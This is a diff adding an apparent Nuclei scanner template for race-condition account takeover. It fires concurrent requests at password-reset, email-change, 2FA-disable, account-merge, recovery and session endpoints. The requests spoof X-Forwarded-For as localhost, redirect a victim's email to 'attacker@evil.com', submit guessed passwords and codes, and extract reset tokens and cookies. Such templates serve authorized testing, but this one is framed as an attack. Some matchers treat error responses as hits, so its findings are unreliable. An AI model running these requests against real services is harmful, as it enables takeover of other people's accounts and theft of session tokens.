@@ -1,0 +1,428 @@
+id: medium-webapp-race-condition-account-takeover
+
+info:
+  name: Race Condition Account Takeover - Elite Red Team
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced race condition exploitation for account takeover attacks.
+    Tests for race conditions in password reset, email verification, and user registration.
+    Includes timing-based attacks and concurrent request manipulation techniques.
+  reference:
+    - https://portswigger.net/web-security/race-conditions
+    - https://owasp.org/www-community/vulnerabilities/Race_condition
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.4
+    cwe-id: CWE-362
+  tags: race-condition,account-takeover,timing-attack,red-team
+
+variables:
+  # Target email for takeover
+  target_email: "victim@example.com"
+  # Attacker email
+  attacker_email: "attacker@evil.com"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/password-reset"
+      - "{{BaseURL}}/forgot-password"
+      - "{{BaseURL}}/api/password-reset"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+
+    # Race condition in password reset - send multiple requests simultaneously
+    body: |
+      email={{target_email}}
+
+    threads: 10
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "reset"
+          - "sent"
+          - "email"
+          - "token"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "rate limit"
+          - "too many requests"
+          - "throttled"
+        condition: and
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'token["\']?\s*:\s*["\']([^"\']+)["\']'
+          - 'reset[_-]?code["\']?\s*:\s*["\']([^"\']+)["\']'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/register"
+      - "{{BaseURL}}/register"
+      - "{{BaseURL}}/signup"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Race condition in user registration
+    body: |
+      {
+        "email": "{{target_email}}",
+        "username": "victim_user",
+        "password": "attacker_password123"
+      }
+
+    threads: 15
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 409
+
+      - type: word
+        part: body
+        words:
+          - "created"
+          - "registered"
+          - "success"
+          - "conflict"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/email/verify"
+      - "{{BaseURL}}/verify-email"
+      - "{{BaseURL}}/email/confirm"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Race condition in email verification
+    body: |
+      email={{target_email}}&code=123456
+
+    threads: 20
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 401
+
+      - type: word
+        part: body
+        words:
+          - "verified"
+          - "confirmed"
+          - "invalid"
+          - "expired"
+        condition: or
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/user/email"
+      - "{{BaseURL}}/user/change-email"
+      - "{{BaseURL}}/profile/email"
+
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # Race condition in email change
+    body: |
+      {
+        "new_email": "{{attacker_email}}",
+        "current_password": "guessed_password"
+      }
+
+    threads: 12
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 202
+
+      - type: word
+        part: body
+        words:
+          - "updated"
+          - "changed"
+          - "pending"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/phone/verify"
+      - "{{BaseURL}}/verify-phone"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Race condition in phone verification
+    body: |
+      phone=+1234567890&code=000000
+
+    threads: 25
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+      - type: word
+        part: body
+        words:
+          - "verified"
+          - "invalid"
+          - "attempts"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/password/change"
+      - "{{BaseURL}}/change-password"
+
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Race condition in password change
+    body: |
+      {
+        "current_password": "old_password",
+        "new_password": "hacked_password123",
+        "confirm_password": "hacked_password123"
+      }
+
+    threads: 8
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 401
+
+      - type: word
+        part: body
+        words:
+          - "changed"
+          - "updated"
+          - "incorrect"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/merge"
+      - "{{BaseURL}}/account/merge"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # Race condition in account merge
+    body: |
+      {
+        "primary_email": "{{target_email}}",
+        "secondary_email": "{{attacker_email}}",
+        "merge_token": "guessed_token"
+      }
+
+    threads: 10
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 202
+
+      - type: word
+        part: body
+        words:
+          - "merged"
+          - "combined"
+          - "success"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/2fa/disable"
+      - "{{BaseURL}}/two-factor/disable"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Race condition in 2FA disable
+    body: |
+      password=guessed_password&confirmation_code=123456
+
+    threads: 15
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+      - type: word
+        part: body
+        words:
+          - "disabled"
+          - "removed"
+          - "invalid"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/recovery"
+      - "{{BaseURL}}/account/recovery"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Race condition in account recovery
+    body: |
+      {
+        "email": "{{target_email}}",
+        "recovery_question": "What is your pet's name?",
+        "recovery_answer": "fluffy"
+      }
+
+    threads: 12
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "recovery"
+          - "reset"
+          - "sent"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/backup-email"
+      - "{{BaseURL}}/profile/backup-email"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Race condition in backup email addition
+    body: |
+      backup_email={{attacker_email}}&verify=false
+
+    threads: 18
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "added"
+          - "backup"
+          - "secondary"
+        condition: or
+
+  - method: DELETE
+    path:
+      - "{{BaseURL}}/api/user/sessions"
+      - "{{BaseURL}}/logout-all"
+
+    headers:
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # Race condition in session invalidation
+    threads: 20
+    race: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        part: body
+        words:
+          - "logged out"
+          - "sessions cleared"
+          - "invalidated"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: response
+        regex:
+          - 'Set-Cookie:\s*([^;\r\n]+)'
+          - 'X-Rate-Limit-Remaining:\s*([^\r\n]+)'
+          - '"token":\s*"([^"]+)"'
